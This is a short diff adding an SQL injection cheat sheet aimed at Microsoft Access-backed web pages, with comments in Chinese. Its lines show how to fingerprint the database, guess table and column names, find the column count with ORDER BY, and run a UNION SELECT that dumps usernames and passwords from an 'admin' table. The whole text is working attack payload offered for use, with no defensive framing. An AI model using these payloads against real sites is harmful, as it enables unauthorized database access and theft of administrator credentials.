@@ -1,0 +1,6 @@
+and exists(select * from msysobjects) /*返回错误页面或返回无权限读取代表是Access数据库*/
+and exists(select * from admin) /*admin为表名，让你猜表名*/
+and exists(select username from admin) /*username为列名,让你猜列名*/
+order by 8 /*猜解字段长度*/
+将id改为0 union select 1,2,3,4,5,6,7,8 from admin /*获取位置*/
+union select 1,username,password,4,5,6,7,8 from admin /*读字段*/
